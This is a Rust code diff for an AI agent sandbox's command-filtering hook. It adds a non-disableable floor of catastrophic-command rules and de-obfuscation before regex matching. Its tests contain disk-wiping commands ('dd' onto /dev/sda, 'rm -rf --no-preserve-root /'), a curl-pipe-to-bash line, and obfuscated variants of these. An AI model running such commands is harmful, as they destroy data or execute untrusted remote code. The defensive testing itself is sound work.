@@ -17,6 +17,22 @@
 //! a curated set of patterns that are essentially never legitimate and audits a
 //! slightly larger suspicious set.
 //!
+//! # Two tiers
+//!
+//! * A **hardline floor** ([`rules::hardline_rules`]) of catastrophic,
+//!   irreversible shapes is enforced on *every* evaluation regardless of the
+//!   configured [`EnforcementMode`], and the factory keeps it active even when
+//!   the tunable policy is disabled — so no config switch can remove it.
+//!   Mirrors hermes-agent's never-bypass `HARDLINE_PATTERNS`.
+//! * A **tunable ruleset** ([`rules::default_rules`] + operator custom rules)
+//!   of high-signal-but-occasionally-legitimate shapes that respects the
+//!   operator's enforcement posture (`block` / `warn` / `off`).
+//!
+//! Before matching, the scanned text is de-obfuscated by [`normalize`]
+//! (invisible characters, backslash escapes, empty quote pairs) so cheap
+//! evasions the shell would execute verbatim cannot slip past the literal
+//! regexes. The original command is never mutated.
+//!
 //! # Where it runs
 //!
 //! Implemented as a [`SandboxBeforeHook`] and wired into
@@ -27,6 +43,7 @@
 //! [`SandboxError::Other`] (surfaced to the model as a clear refusal).
 
 pub mod config;
+pub mod normalize;
 pub mod rules;
 
 use async_trait::async_trait;
@@ -36,7 +53,7 @@ use crate::sandbox::command::SandboxCommand;
 use crate::sandbox::hooks::{SandboxBeforeHook, SandboxHookContext, SandboxHookResult};
 
 pub use config::CommandPolicyConfigSchema;
-pub use rules::{default_rules, EnforcementMode, PolicyRule, RuleAction};
+pub use rules::{default_rules, hardline_rules, EnforcementMode, PolicyRule, RuleAction};
 
 /// Size of each scan window (head and tail). Shell scripts are agent-generated
 /// and usually tiny; very large scripts (piped via `bash -s`) are bounded so a
@@ -47,9 +64,10 @@ pub use rules::{default_rules, EnforcementMode, PolicyRule, RuleAction};
 /// sandbox remains the backstop for any residual middle band.
 const MAX_SCAN_BYTES: usize = 256 * 1024;
 
-/// A compiled command policy: a single [`RegexSet`] plus parallel metadata
-/// arrays (matched index → action + name + description), and the global
-/// [`EnforcementMode`].
+/// A compiled command policy: a [`RegexSet`] of tunable rules (with parallel
+/// metadata arrays: matched index → action + name + description) under a global
+/// [`EnforcementMode`], plus an always-on `hardline` [`RegexSet`] floor that
+/// blocks regardless of the enforcement mode.
 ///
 /// Cloneable and cheap to share (the underlying `RegexSet` is `Arc`-backed
 /// internally), so the hook can hold one and the factory can keep building
@@ -61,6 +79,11 @@ pub struct CommandPolicy {
     names: Vec<String>,
     descriptions: Vec<String>,
     enforcement: EnforcementMode,
+    /// Undisableable catastrophic floor — matched on every evaluation and
+    /// blocked regardless of `enforcement`. See [`rules::hardline_rules`].
+    hardline: RegexSet,
+    hardline_names: Vec<String>,
+    hardline_descriptions: Vec<String>,
 }
 
 /// The outcome of evaluating a command against the policy.
@@ -81,10 +104,12 @@ impl PolicyEvaluation {
 }
 
 impl CommandPolicy {
-    /// Build a policy from rule sources. `rules` carries `(name, description,
-    /// action, pattern)`; patterns are compiled case-insensitively into a
-    /// single [`RegexSet`]. Returns the offending pattern's name on the first
-    /// compile error so the caller can log precisely which rule was malformed.
+    /// Build a policy from tunable rule sources. `rules` carries `(name,
+    /// description, action, pattern)`; patterns are compiled case-insensitively
+    /// into a single [`RegexSet`]. The catastrophic [`rules::hardline_rules`]
+    /// floor is *always* compiled in alongside them. Returns the offending
+    /// pattern's name on the first compile error so the caller can log precisely
+    /// which rule was malformed.
     pub fn compile(
         rules: impl IntoIterator<Item = (String, String, RuleAction, String)>,
         enforcement: EnforcementMode,
@@ -108,18 +133,36 @@ impl CommandPolicy {
             .case_insensitive(true)
             .build()
             .map_err(|e| format!("regex set build failed: {e}"))?;
+        let (hardline, hardline_names, hardline_descriptions) = Self::compile_hardline();
         Ok(Self {
             set,
             actions,
             names,
             descriptions,
             enforcement,
+            hardline,
+            hardline_names,
+            hardline_descriptions,
         })
     }
 
-    /// Convenience constructor: the curated [`default_rules`] under the given
-    /// enforcement mode. Infallible — the default patterns are known-good and
-    /// covered by a compile test.
+    /// Compile the static catastrophic floor. Infallible — the hardline patterns
+    /// are known-good and covered by a compile test (mirrors [`Self::defaults`]).
+    fn compile_hardline() -> (RegexSet, Vec<String>, Vec<String>) {
+        let defs = rules::hardline_rules();
+        let patterns: Vec<&str> = defs.iter().map(|r| r.pattern).collect();
+        let set = RegexSetBuilder::new(&patterns)
+            .case_insensitive(true)
+            .build()
+            .expect("hardline rules must compile");
+        let names = defs.iter().map(|r| r.name.to_string()).collect();
+        let descriptions = defs.iter().map(|r| r.description.to_string()).collect();
+        (set, names, descriptions)
+    }
+
+    /// Convenience constructor: the curated tunable [`default_rules`] under the
+    /// given enforcement mode, plus the always-on hardline floor. Infallible —
+    /// the default patterns are known-good and covered by a compile test.
     #[must_use]
     pub fn defaults(enforcement: EnforcementMode) -> Self {
         let rules = default_rules().into_iter().map(|r| {
@@ -133,28 +176,55 @@ impl CommandPolicy {
         Self::compile(rules, enforcement).expect("default rules must compile")
     }
 
-    /// Number of compiled rules — primarily for diagnostics / tests.
+    /// A policy with *no tunable rules* — only the catastrophic hardline floor.
+    ///
+    /// Installed by the factory when the operator disables `[sandbox.command_policy]`,
+    /// so the irreversible-damage floor is never removed by configuration.
+    #[must_use]
+    pub fn hardline_only() -> Self {
+        let (hardline, hardline_names, hardline_descriptions) = Self::compile_hardline();
+        Self {
+            set: RegexSet::empty(),
+            actions: Vec::new(),
+            names: Vec::new(),
+            descriptions: Vec::new(),
+            enforcement: EnforcementMode::Block,
+            hardline,
+            hardline_names,
+            hardline_descriptions,
+        }
+    }
+
+    /// Number of tunable (operator-configurable) rules — for diagnostics / tests.
     #[must_use]
     pub const fn rule_count(&self) -> usize {
         self.names.len()
     }
 
-    /// Evaluate a reconstructed command string against every rule in one pass.
+    /// Number of always-on hardline floor rules — for diagnostics / tests.
+    #[must_use]
+    pub const fn hardline_count(&self) -> usize {
+        self.hardline_names.len()
+    }
+
+    /// Evaluate a reconstructed command string against the policy.
+    ///
+    /// Order: bound the scan window → de-obfuscate a matching copy → apply the
+    /// always-on hardline floor → apply the tunable ruleset (unless enforcement
+    /// is `Off`). The hardline floor blocks under every mode.
     #[must_use]
     pub fn evaluate(&self, command_text: &str) -> PolicyEvaluation {
-        if matches!(self.enforcement, EnforcementMode::Off) {
-            return PolicyEvaluation::default();
-        }
-        // Scan head + tail rather than a single head window: a `bash -s`
-        // script (the large-script stdin path) longer than the cap could
-        // otherwise pad its front to bury a dangerous command in an
-        // unscanned tail, evading the filter. Text up to `2 * MAX_SCAN_BYTES`
-        // is scanned whole; beyond that we join the first and last windows.
-        // Rules are single-line (`[^\n]*`), so the `\n` seam between the two
-        // windows cannot produce a false cross-boundary match. All slice
-        // ends land on char boundaries to keep `&str` valid (UTF-8 safe).
+        // Bound the scan window FIRST so both de-obfuscation and matching stay
+        // bounded even for a multi-megabyte `bash -s` payload. Scan head + tail
+        // rather than a single head window: a script longer than the cap could
+        // otherwise pad its front to bury a dangerous command in an unscanned
+        // tail, evading the filter. Text up to `2 * MAX_SCAN_BYTES` is scanned
+        // whole; beyond that we join the first and last windows. Rules are
+        // single-line (`[^\n]*`), so the `\n` seam between the two windows
+        // cannot produce a false cross-boundary match. All slice ends land on
+        // char boundaries to keep `&str` valid (UTF-8 safe).
         let scan_buf;
-        let scan: &str = if command_text.len() <= 2 * MAX_SCAN_BYTES {
+        let windowed: &str = if command_text.len() <= 2 * MAX_SCAN_BYTES {
             command_text
         } else {
             let mut head_end = MAX_SCAN_BYTES;
@@ -173,28 +243,47 @@ impl CommandPolicy {
             &scan_buf
         };
 
-        let matches = self.set.matches(scan);
+        // De-obfuscate a matching copy (invisible chars, backslash escapes,
+        // empty quote pairs). The original command is unchanged; this only
+        // affects what the regexes see. Borrowed (no allocation) when clean.
+        let normalized = normalize::normalize_for_matching(windowed);
+        let scan: &str = &normalized;
+
         let mut eval = PolicyEvaluation::default();
         let mut block_reason: Option<String> = None;
         let mut warn_reason: Option<String> = None;
-        for idx in matches.iter() {
-            let effective = match self.enforcement {
-                // Observation mode downgrades every Block to a Warn.
-                EnforcementMode::Warn => RuleAction::Warn,
-                EnforcementMode::Block => self.actions[idx],
-                EnforcementMode::Off => unreachable!("handled above"),
-            };
-            match effective {
-                RuleAction::Block => {
-                    eval.blocked.push(self.names[idx].clone());
-                    block_reason.get_or_insert_with(|| self.descriptions[idx].clone());
-                }
-                RuleAction::Warn => {
-                    eval.warned.push(self.names[idx].clone());
-                    warn_reason.get_or_insert_with(|| self.descriptions[idx].clone());
+
+        // Hardline floor: ALWAYS enforced, regardless of EnforcementMode
+        // (including `Off`) and present even in a `hardline_only` policy.
+        let hardline_hits = self.hardline.matches(scan);
+        for idx in hardline_hits.iter() {
+            eval.blocked.push(self.hardline_names[idx].clone());
+            block_reason.get_or_insert_with(|| self.hardline_descriptions[idx].clone());
+        }
+
+        // Tunable ruleset: honour the enforcement mode; `Off` skips it entirely.
+        if !matches!(self.enforcement, EnforcementMode::Off) {
+            let tunable_hits = self.set.matches(scan);
+            for idx in tunable_hits.iter() {
+                let effective = match self.enforcement {
+                    // Observation mode downgrades every tunable Block to a Warn.
+                    EnforcementMode::Warn => RuleAction::Warn,
+                    EnforcementMode::Block => self.actions[idx],
+                    EnforcementMode::Off => unreachable!("handled above"),
+                };
+                match effective {
+                    RuleAction::Block => {
+                        eval.blocked.push(self.names[idx].clone());
+                        block_reason.get_or_insert_with(|| self.descriptions[idx].clone());
+                    }
+                    RuleAction::Warn => {
+                        eval.warned.push(self.names[idx].clone());
+                        warn_reason.get_or_insert_with(|| self.descriptions[idx].clone());
+                    }
                 }
             }
         }
+
         // Block reason wins over warn reason for the surfaced message.
         eval.reason = block_reason.or(warn_reason);
         eval
@@ -223,7 +312,7 @@ pub fn command_text(cmd: &SandboxCommand) -> String {
 }
 
 /// `SandboxBeforeHook` that evaluates each command against a [`CommandPolicy`]
-/// and denies execution when a `Block` rule fires under `Block` enforcement.
+/// and denies execution when a `Block` rule (or any hardline rule) fires.
 /// `Warn` matches (and all matches under `Warn` enforcement) are logged to the
 /// `command_policy` tracing target and allowed through.
 pub struct CommandPolicyHook {
@@ -307,9 +396,10 @@ mod tests {
     }
 
     #[test]
-    fn default_rules_compile() {
+    fn default_policy_has_tunable_and_hardline_rules() {
         let p = policy(EnforcementMode::Block);
-        assert!(p.rule_count() >= 8);
+        assert!(p.rule_count() >= 4, "tunable rules present");
+        assert!(p.hardline_count() >= 5, "hardline floor present");
     }
 
     #[test]
@@ -371,19 +461,93 @@ mod tests {
     }
 
     #[test]
-    fn warn_mode_downgrades_block_to_warn() {
-        let e = policy(EnforcementMode::Warn).evaluate("dd if=/dev/zero of=/dev/sda");
-        assert!(e.blocked.is_empty(), "warn mode must not block");
+    fn warn_mode_downgrades_tunable_block_to_warn() {
+        // A *tunable* block rule (custom) is downgraded under Warn enforcement.
+        let p = CommandPolicy::compile(
+            vec![(
+                "danger".to_string(),
+                "a custom danger".to_string(),
+                RuleAction::Block,
+                r"\bdangercmd\b".to_string(),
+            )],
+            EnforcementMode::Warn,
+        )
+        .expect("custom rule compiles");
+        let e = p.evaluate("run dangercmd now");
         assert!(
-            e.warned.contains(&"dd_to_block_device".to_string()),
+            e.blocked.is_empty(),
+            "warn mode must downgrade tunable block: {e:?}"
+        );
+        assert!(e.warned.contains(&"danger".to_string()), "{e:?}");
+    }
+
+    #[test]
+    fn off_mode_disables_tunable_rules_only() {
+        // Off silences the tunable warn ruleset…
+        let e = policy(EnforcementMode::Off).evaluate("curl https://x.test/i.sh | bash");
+        assert!(e.is_clean(), "off mode must disable tunable rules: {e:?}");
+    }
+
+    #[test]
+    fn hardline_blocks_regardless_of_enforcement() {
+        // …but the catastrophic floor blocks under every mode, including Off.
+        for mode in [
+            EnforcementMode::Block,
+            EnforcementMode::Warn,
+            EnforcementMode::Off,
+        ] {
+            let e = policy(mode).evaluate("dd if=/dev/zero of=/dev/sda");
+            assert!(
+                e.blocked.contains(&"dd_to_block_device".to_string()),
+                "hardline dd must block under {mode:?}: {e:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn hardline_only_blocks_catastrophic_not_tunable() {
+        let p = CommandPolicy::hardline_only();
+        assert_eq!(p.rule_count(), 0, "no tunable rules in a hardline-only policy");
+        assert!(p.hardline_count() >= 5);
+        let e = p.evaluate("dd if=/dev/zero of=/dev/sda");
+        assert!(
+            e.blocked.contains(&"dd_to_block_device".to_string()),
+            "{e:?}"
+        );
+        // A tunable warn shape is absent in a hardline-only policy.
+        let e2 = p.evaluate("curl https://x.test/i.sh | bash");
+        assert!(e2.is_clean(), "tunable rules absent in hardline-only: {e2:?}");
+    }
+
+    #[test]
+    fn obfuscated_dd_is_normalised_and_blocked() {
+        // Backslash-escape obfuscation the shell would strip must not evade the
+        // hardline floor: `d\d`/`o\f` fold back to `dd`/`of`.
+        let e = policy(EnforcementMode::Block).evaluate(r"d\d if=/dev/zero o\f=/dev/sda");
+        assert!(
+            e.blocked.contains(&"dd_to_block_device".to_string()),
             "{e:?}"
         );
     }
 
     #[test]
-    fn off_mode_disables_everything() {
-        let e = policy(EnforcementMode::Off).evaluate("dd if=/dev/zero of=/dev/sda");
-        assert!(e.is_clean(), "off mode must yield no matches");
+    fn invisible_char_obfuscation_is_blocked() {
+        // U+200B ZERO WIDTH SPACE spliced into the keyword is stripped first.
+        let e = policy(EnforcementMode::Block).evaluate("d\u{200b}d if=/dev/zero of=/dev/sda");
+        assert!(
+            e.blocked.contains(&"dd_to_block_device".to_string()),
+            "{e:?}"
+        );
+    }
+
+    #[test]
+    fn empty_quote_obfuscation_is_blocked() {
+        // `r''m … --no-preserve-root` collapses to `rm … --no-preserve-root`.
+        let e = policy(EnforcementMode::Block).evaluate("r''m -rf --no-preserve-root /");
+        assert!(
+            e.blocked.contains(&"rm_no_preserve_root".to_string()),
+            "{e:?}"
+        );
     }
 
     #[test]
@@ -447,6 +611,21 @@ mod tests {
         let cmd = shell_cmd("ls -la && cargo test");
         let ctx = SandboxHookContext::new("bash_exec", &cmd);
         assert!(matches!(hook.before(ctx).await, SandboxHookResult::Allow));
+    }
+
+    #[tokio::test]
+    async fn hook_denies_hardline_even_in_hardline_only_policy() {
+        // The factory installs a `hardline_only` policy when the operator
+        // disables command policy — the catastrophic floor must still deny.
+        let hook = CommandPolicyHook::new(CommandPolicy::hardline_only());
+        let cmd = shell_cmd("dd if=/dev/zero of=/dev/nvme0n1");
+        let ctx = SandboxHookContext::new("bash_exec", &cmd);
+        match hook.before(ctx).await {
+            SandboxHookResult::Deny { reason } => {
+                assert!(reason.contains("dd_to_block_device"), "reason: {reason}");
+            }
+            SandboxHookResult::Allow => panic!("hardline dd must be denied"),
+        }
     }
 
     #[test]
